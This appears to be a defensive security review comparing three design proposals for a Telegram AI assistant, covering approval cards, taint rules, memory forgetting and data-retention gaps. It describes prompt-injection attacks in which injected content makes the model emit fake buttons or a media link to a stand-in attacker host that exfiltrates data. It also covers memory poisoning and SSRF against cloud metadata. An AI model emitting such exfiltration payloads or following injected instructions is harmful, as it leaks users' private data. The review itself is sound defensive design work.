scores.notes:
This is the strongest security design. Only the executor can run tools, which an import-graph test enforces. Sentinel is a pure, ordered rule table (S01-S99), and the model has no tool that can approve, grant or change permissions. Approval cards are rendered by code and executed from a stored payload whose sha256 must match, with no model call between the tap and execution. Model output is sanitized (tg-button, web_app and login_url tags are stripped, and lines that imitate the card header are neutralized). State footers come from the DB, never from model text.

The best anti-injection idea across all three proposals is recipient provenance: trusted_targets plus rule S10, which says a recipient that came from untrusted content always asks and can never be covered by a grant. Encryption is per-user DEK stored in a separate keys.db, so crypto-shredding really reaches backups. Forgetting is real: epoch rotation, shredding and forgotten-fact fingerprints, and the residual copy in the prompt cache is disclosed. Business content is kept as metadata only until the owner consents per chat. Guest mode needs an explicit tap to continue privately. There is a /pause kill switch. Anthropic metadata.user_id is HMAC-ed.

Weaknesses:
- Rule S11 still lets a tainted run auto-send when a grant exists and the target is trusted. Injected content or leaked private data can then reach a legitimate recipient.
- gmail_send_draft approves a draft_id rather than its content, which is a TOCTOU gap.
- The ledger is one global hash chain with no external anchor, and per-user deletion breaks it.
- Watcher fetches have no SSRF guard.
- Rich Markdown media and link URLs in model output are not sanitized, so an exfiltration channel remains.
- Memory extraction can take in tool_result text, which risks memory poisoning, although provenance blunts it.
- The fallback to a system-reminder inside the user turn loses operator authority.

Scope is large (missions, watchers, secretary, integrations, Mini App), but the plan phases it well.

This has the richest and most Telegram-native product, and its trust core is good:
- HMAC-signed callback_data bound to the owner, with a CAS state change and tool_use_id idempotency.
- The strictest taint rule of the three: once a run has read untrusted content, every standing grant for send_external is void.
- A biometric step-up (BiometricManager token hash) is required before any 'Always' send grant.
- A separate context builder and the PUBLIC toolset handle guest replies, with a canary-fact test.
- Ephemeral per-user answers inside groups.
- deleted_business_messages purges stored copies and voids drafts.

The privacy and injection surface is also the largest, and several gaps are material:
- Forgetting is cosmetic. memory_forget nulls a column under a single HKDF master key, which is not crypto-shredding, and the fact stays in the append-only transcript that is replayed to Claude.
- Every business_message is stored for 30 days even in chats where AI is off.
- Style samples ('owner's last 15 outgoing messages') can pull text from chats that were never consented to Anthropic, which breaches ToS 5.4(iv).
- A guest summon auto-starts a DM event-run with the full private toolset, seeded by untrusted replied-to text. That is a cross-context injection bridge.
- integration_action is a generic Composio passthrough that classifies actions by their metadata, so it fails open.
- Model Rich Markdown is not sanitized, so injected tg-button, url or login_url buttons and ![](url) media can spoof approvals or exfiltrate data.
- Watchers fetch arbitrary URLs with no SSRF guard.
- In Reader mode, messages from group members who never consented go to Anthropic with only a pinned notice.
- Transcripts, memory and ledger are kept indefinitely.

The scope (inline, checklists, location, reactions, secretary, groups, topics, Stars) is too large for a trustworthy v1.

It has the smallest attack surface and is the most shippable. There is no Secretary Mode in v1, which means no Business ToS exposure, and no OAuth integrations. Outbound HTTP goes only through host-allowlisted adapters, which is the best SSRF posture of the three. An explicit memory consent card appears at /start. Scope comes from Telegram identity and never from tool input. A wire-level test checks that private fact strings never appear in group or guest requests. Quotas are checked before any LLM call. Cards are HMAC-signed, compared with CAS and rendered from validated input.

Weaknesses:
- 'Forget' only drops the fact from future context. The fact stays in the active episode's replayed history, and closed episodes are kept for 90 days.
- A single data key means /deleteme never reaches Litestream backups.
- Model Rich Markdown is not sanitized (tg-button and media URLs).
- 'Always for this chat' is offered on the first card, with no trust ladder or step-up.
- One toolset serves every surface and isolation relies on policy alone, so a single policy bug leaks.
- Private /catchup recaps are generated inside the shared group conversation, so later public turns can surface them.
- Technical errors: an episode starts with a system row (a 400 error), side-calls use thinking:disabled (which conflicts with the stated opus-5-5 migration path), and a files beta header is added mid-conversation even though the Files API is GA.

User value falls short of Muse's core promise of connected apps and actions, which it defers to v1.1.

best_ideas_to_graft: From telegram-native: replace trust-agent's rule S11 grant path with the stricter rule 'a tainted run voids ALL standing grants for send/write, so every outbound action needs a fresh tap on an exact-diff card'. This closes the path where injected content or leaked private data goes out to a trusted recipient.

From telegram-native: require a BiometricManager step-up (server-issued secret; server stores only its hash; checked on POST) before creating any 'always' grant for R2 sends. Fall back to initData no older than 5 minutes plus a typed confirm phrase.

From telegram-native: ephemeral_message_parameters for per-user answers and personal approvals inside groups, falling back to a DM. Also a canary-fact CI test that a planted private fact never appears in any guest or group wire request (pragmatic-mvp scans every request the same way).

From telegram-native: Undo instead of an approval for truly reversible self-space R1 actions (own-calendar holds without attendees, drafts, reminders), with a 10-minute window. This cuts approval fatigue without adding third-party exposure.

From telegram-native: when deleted_business_messages arrives, hard-delete the stored copies, void drafts that quote them, and purge any drafting segment that included them. Store only ids for guest invocations (guest_invocations table).

From pragmatic-mvp: no generic server-side HTTP. Every adapter is host-allowlisted, and arbitrary URL reads go only through Anthropic web_fetch. For user-defined page watchers, add an SSRF guard: resolve DNS first, block RFC1918, loopback, link-local and 169.254.169.254, re-check every redirect, and never allow the app's own origin.

From pragmatic-mvp: an explicit, revocable memory-consent card at /start before any extraction, with incognito as a first-class choice. Also a quota check with a template reply before any LLM call, so abuse costs nothing.
From pragmatic-mvp: make context_mode a per-conversation setting ('inline' when role:'system' is rejected) that never changes mid-episode. Do not silently move operator context into user-turn text.

New, missing from all three: a deterministic output sanitizer for Rich Markdown. Strip every <tg-button>/<tg-button-row>, login_url and web_app. Drop or rewrite ![](url) media blocks, <tg-collage>, <tg-slideshow> and link targets whose hosts are not allowlisted or cited in this turn (Telegram fetches media URLs, which makes them a zero-click exfiltration channel). Neutralize text that imitates the card header.

New: run the memory extractor only over user-authored input blocks, never over tool_result, web, email, business-peer or guest text. Facts from any other source become pending_confirm and are shown with their source.

New: bind a send approval to content, not a handle. For gmail_send_draft, hash the recipients, subject and body when the card is created, re-fetch the draft at execution, and abort with a new card if the hash differs.

New: keep one ledger hash chain per user and anchor the chain head periodically (for example in the user's own DM or an external log), so deleting one account never breaks another user's verification.

New: /delete_me and retention jobs must also delete Anthropic Files API uploads and code-execution containers, the Composio connected accounts and the Groq/OpenAI-side artifacts, and list these processors in /privacy.
New: bind 'continue privately' deep-link tokens (start=g_<token>) to the original caller's tg_user_id and make them single-use. Guest replies are public, so anyone in the chat can tap the button.

New: store content hashes (content_sha256, payload_sha256) as keyed HMACs instead of plain SHA-256, so short or low-entropy messages ('yes', OTP-like strings) cannot be recovered by brute force from the plaintext hash columns.
technical_errors_found: pragmatic-mvp: 'Episode+1 starts with a <previous-episode> system row' contradicts its own grammar ('messages[0] is a user row'). A mid-conversation role:'system' message cannot be messages[0] and must follow a user turn, so as written the first request of every rolled-over episode returns 400.

pragmatic-mvp: the rollover side-call uses thinking {type:'disabled'} while claiming a move to claude-opus-5-5 is config-only. Opus 5.5 rejects thinking.type 'disabled' with a 400. It also calls client.beta.messages.parse, but the documented structured-output entry point is client.messages.parse with output_config.format.

pragmatic-mvp: adds 'the files beta header only for those conversations'. The Files API is GA, and sending files-api-2025-04-14 returns the old beta response shapes. Changing the beta set mid-conversation also changes request shape and cache behavior.

telegram-native: memory_forget 'crypto-shreds the row', but every value is encrypted under keys derived by HKDF from a single GORA_MASTER_KEY. Nulling text_enc is plain deletion (backups still decrypt), and the fact remains in the append-only transcript that is replayed to Claude every turn, so per-fact forget does not remove it from model context. pragmatic-mvp has the same gap ('replayed history is never edited'; closed episodes kept 90 days).

telegram-native: secretary drafting uses 'the owner's last 15 outgoing messages as style samples' without restricting them to AI-consented chats. That sends Business content from non-authorized chats to Anthropic, violating Bot Developer ToS 5.4(iv) and its own per-chat consent model.

telegram-native: stores every business_message (encrypted, 30 days) including chats where AI is off. That is not required for the service and conflicts with data minimization under ToS 4.2 and 5.4(ii). Trust-agent's metadata-only-until-consent approach is the compliant pattern.

telegram-native: when a guest summon needs private data, it auto-starts a DM event-run with the FULL toolset, private memory and connections, seeded by the untrusted summoning and replied-to text. This bridges public-context injection into the private agent without a user tap.

telegram-native: integration_action classifies arbitrary Composio actions as read or write from toolkit metadata. Classification fails open when metadata is wrong or missing. Unknown actions must default to ask (or deny), and a generic passthrough also breaks the curated static-toolset model.
telegram-native: group approvals are 'also ephemeral' but the card includes an Edit web_app button. web_app inline buttons work only in private chats, so the send returns 400 in groups.

telegram-native and pragmatic-mvp: model output is sent as Rich Markdown without sanitization. Injected content can make the model emit <tg-button type=url|login_url|callback_data> (fake approve buttons, phishing links, unsigned callbacks such as 'ck:' toggles) or ![](https://attacker/?d=...) media blocks, which Telegram fetches, giving zero-click exfiltration. trust-agent strips buttons but still allows media and link URLs.

trust-agent: gmail_send_draft is approved and executed by draft_id with 'payload sha256 must match'. The payload is only the id, so the draft body or recipients can change after the card is rendered (TOCTOU). The content hash must be re-verified at execution.

trust-agent: rule S11 allows a tainted run to act without a new tap when a grant exists and all targets are trusted. Injected body content, or private data pulled by the injection, can then be auto-sent to a legitimate trusted recipient.

trust-agent: the ledger is a single hash chain (prev_hash of the previous row globally) while /delete_me deletes a user's rows, which breaks verification for everyone after them. Without external anchoring the chain is also not tamper-evident against an attacker who can write to the DB.

trust-agent and telegram-native: page and price watchers fetch user- or model-supplied URLs server-side with no private-IP, DNS-rebinding or redirect guard. That is SSRF against cloud metadata (169.254.169.254), localhost /api and internal services. 'GET only plus host logging' is not an SSRF control.

trust-agent: the transport fallback moves the per-turn context into a system-reminder text block inside the user turn when role:'system' is rejected. That content no longer carries operator authority and sits in the same channel as spoofable user and untrusted text.

All three: auto memory extraction and segment or epoch handoff summaries run over turns that include tool_result, email, web or business text, so an injected 'fact' or instruction becomes persistent memory or seed context (persistent prompt injection). The extractor must read only user-authored blocks.

All three: 'continue privately' or 'Open in Gora' deep links (start=g_<token>) appear in public guest replies and are not described as bound to the caller's tg_user_id or single-use, so another chat member can open the caller's request context.

All three: /deletemydata does not cover Anthropic Files API uploads or per-user code-execution containers (kept 30 days) that were created for PDFs and make_file, so deletion is incomplete under ToS 4.2.

All three: content_sha256 or payload_sha256 are stored as plaintext SHA-256 next to encrypted content, so short or low-entropy messages can be recovered by dictionary attack. They should be keyed HMACs.

telegram-native and pragmatic-mvp: the group Reader/catch-up modes buffer and send every member's messages to Anthropic based only on admin opt-in plus a pinned notice. In pragmatic-mvp the private /catchup recap is also produced inside the shared group conversation transcript, so later public group turns can resurface content that was delivered privately.
